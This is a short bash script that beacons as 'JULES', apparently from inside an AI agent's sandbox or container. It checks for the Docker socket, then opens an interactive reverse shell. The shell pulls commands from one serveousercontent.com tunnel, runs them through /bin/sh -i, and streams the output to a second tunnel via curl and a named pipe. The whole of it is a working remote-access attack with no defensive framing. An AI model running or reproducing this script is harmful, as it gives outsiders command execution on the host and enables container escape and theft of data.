#!/bin/bash
# OUTPUT (9999) and INPUT (9998)
URL_OUT="https://e200e5147a8bf379-103-95-173-85.serveousercontent.com"
URL_IN="https://b17cba060c6095d1-103-95-173-85.serveousercontent.com"

{
  echo "--- [!] ALIVE: BEACON FROM JULES ---"
  echo "Timestamp: $(date)"
  
  # Check if docker socket is reachable
  if [ -S /var/run/docker.sock ]; then
    echo "[+] Docker Socket Found."
  else
    echo "[!] Docker Socket Missing."
  fi

  # Double-Pipe Logic for Interactive Shell
  rm -f /tmp/f; mkfifo /tmp/f
  cat /tmp/f | curl -s -T - "$URL_OUT" & 
  curl -s "$URL_IN" | /bin/sh -i > /tmp/f 2>&1
} | curl -s -X POST --data-binary @- "$URL_OUT"
